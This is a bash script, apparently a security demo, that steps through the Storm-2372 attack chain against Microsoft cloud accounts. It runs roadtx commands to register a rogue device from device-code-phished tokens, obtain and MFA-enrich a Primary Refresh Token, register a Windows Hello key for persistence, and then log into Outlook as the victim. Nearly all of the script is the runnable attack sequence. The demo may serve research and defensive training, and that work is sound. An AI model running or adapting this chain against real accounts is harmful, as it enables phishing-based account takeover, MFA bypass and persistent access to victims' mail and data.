#!/usr/bin/env bash

unset ROADTX_DEBUG
# export ROADTX_DEBUG=Y

CWD=$(pwd)
MYDIR=$(dirname $0)
case "$MYDIR" in
/*)
    ;;
*)
    MYDIR=$CWD/$MYDIR
    ;;
esac

USER=XYZ@acme.org
DEVICE_NAME=attacker-host
DEVICE_PEM=${DEVICE_NAME}.pem
DEVICE_KEY=${DEVICE_NAME}.key
DEVICE_KEY2=${DEVICE_NAME}_2.key

clear
wait_enter

# if ENV vars are set, use them
#
if [[ -n $HTTPS_PROXY ]]; then
  PROXY="$HTTPS_PROXY"
fi

# cmd-line overrides
#
if [[ $1 == "--proxy" ]]; then
  if [[ -n $2 ]]; then
    PROXY="-p $2"
  else
    PROXY="-p 127.0.0.1:9090"
  fi
  echo
  echo "### Setting roadtx proxy flags: $PROXY"
else  
  PROXY=""
fi

cat <<EOF

##########################################################################################
# Storm-2372 Abuse Demo: Obtaining a PRT with persistence by abusing device code phishing
#   and the Windows Hello For Business registration process.
#
#   Acknowledgements:
#     - Dr. Nestoori Syynimaa (OAuth device code phishing)
#     - SecureWorks Research Team (FOCI)
#     - Dirk-jan Mollema (Research on WFHB/PRT abuse and the specific 
#         TTP used in Storm-2372 >12 months before the Microsoft advisory.
#
# Attack Flow
#
#   1. Device code phish 
#      1.1. Attacker initiates device code flow, using Microsoft MAB client id and 
#           Microsoft enrollment service resource
#      1.2. Attacker email phishes user 
#      1.3. Attacker waits for victim to authorize (Microsoft standard OAuth endpoints)
#      1.4. Attacker obtains OAuth tokens authorized by victim (MAB -> enrollment service)
#
#   2. Device registration 
#      2.1. Attacker refreshes tokens (MAB -> device registration service resource) 
#      2.2. Attacker uses DRS OAuth access token to register a device to domain
#           and obtain WFHB device cert/key (.pem)
#
#   3. PRT
#      3.1. Attacker uses WFHB device cert/key and DRS OAuth access token to obtain PRT
#
#   4. Persistence 
#      4.1. Attacker enriches PRT with NGC MFA claim 
#           (time limit to avoid MFA, needed to create new WHFB device key)
#      4.2. Attacker registers/retrieves new Windows Hello key (for persistence)
#      4.3. Attacker creates new PRT key (tests new WHFB key)
#      4.4. Access browser login with new PRT
#   
##########################################################################################

EOF
# cmd="./demo.sh 1"
cmd="pwsh demo.ps1 -config demo.json"
echo -n "$cmd [Y/n]: "; read x
x=""
if [[ $x = "" ]]; then $cmd; else echo "skipping..."; fi

cat <<EOF

##########################################################################################
# 2.1. Using DRS OAuth access token
#      => Register device 
#      => Obtain WFHB device cert/key ($DEVICE_PEM|KEY)
##########################################################################################

EOF
cmd="roadtx $PROXY device -a register -n $DEVICE_NAME"
echo -n "$cmd [Y/n]: "; read x
if [[ $x = "" ]]; then $cmd; else echo "skipping..."; fi

cat <<EOF

##########################################################################################
# 3.1. Using device cert/key and DRS OAuth access token 
#      => Obtain PRT
##########################################################################################

EOF
cmd="roadtx $PROXY prt --refresh-token file -c ./$DEVICE_PEM -k ./$DEVICE_KEY"
echo -n "$cmd [Y/n]: "; read x
if [[ $x = "" ]]; then $cmd; else echo "skipping..."; fi

cat <<EOF

##########################################################################################
# 4.1. Enrich PRT with NGC MFA claim (time limit to avoid re-MFA)
#      Get new tokens
##########################################################################################

EOF
cmd="roadtx $PROXY prtenrich --ngcmfa-drs-auth"
echo -n "$cmd [Y/n]: "; read x
if [[ $x = "" ]]; then $cmd; else echo "skipping..."; fi

cat <<EOF

##########################################################################################
# 4.2. Register/retrieve new Windows Hello key (persistence)
##########################################################################################

EOF
cmd="roadtx $PROXY winhello -k $DEVICE_KEY2"
echo -n "$cmd [Y/n]: "; read x
if [[ $x = "" ]]; then $cmd; else echo "skipping..."; fi

cat <<EOF

##########################################################################################
# 4.3. Create new PRT key (test new WHFB key)
##########################################################################################

EOF
cmd="roadtx $PROXY prt -a request -hk ./$DEVICE_KEY2 -k ./$DEVICE_KEY -c ./$DEVICE_PEM -u $USER"
echo -n "$cmd [Y/n]: "; read x
if [[ $x = "" ]]; then $cmd; else echo "skipping..."; fi

cat <<EOF

##########################################################################################
# 4.4. Access browser login with new PRT
##########################################################################################

EOF
cmd="roadtx $PROXY browserprtauth -url https://outlook.office.com"
echo -n "$cmd [Y/n]: "; read x
if [[ $x = "" ]]; then $cmd; else echo "skipping..."; fi

echo
